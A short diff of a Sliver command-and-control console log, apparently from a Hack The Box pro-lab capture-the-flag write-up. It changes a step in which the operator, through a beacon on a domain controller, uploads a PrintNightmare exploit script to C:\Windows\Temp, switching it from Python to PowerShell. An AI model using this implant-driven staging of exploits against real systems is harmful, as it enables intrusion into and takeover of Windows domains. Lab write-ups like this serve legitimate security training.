@@ -419,13 +419,15 @@ sliver (BLUSHING_ERROR) > upload /home/joel/hacking/ctf/htb/pro-lab/puppet/scrip
 
 [*] Beacon dd83afe7 BLUSHING_ERROR - 172.16.40.5:58287 (DC01) - windows/amd64 - Mon, 13 Jul 2026 20:18:03 CEST
 
-sliver (BLUSHING_ERROR) > upload /home/joel/hacking/ctf/htb/pro-lab/puppet/scripts/printNightmare.py C:\\Windows\\Temp\\printNightmare.py
+sliver (BLUSHING_ERROR) > upload /home/joel/hacking/ctf/htb/pro-lab/puppet/scripts/printNightmare.ps1 C:\\Windows\\Temp\\printNightmare.ps1
 
-[*] Tasked beacon BLUSHING_ERROR (b7f5067d)
+[*] Tasked beacon BLUSHING_ERROR (b1107957)
 
-[+] BLUSHING_ERROR completed task b7f5067d
+[*] Beacon 38dbf5b4 BLUSHING_ERROR - 172.16.40.5:59133 (DC01) - windows/amd64 - Mon, 13 Jul 2026 20:28:18 CEST
 
-[*] Wrote file to C:\Windows\Temp\printNightmare.py
+[+] BLUSHING_ERROR completed task b1107957
+
+[*] Wrote file to C:\Windows\Temp\printNightmare.ps1
 
 sliver (BLUSHING_ERROR) >
 
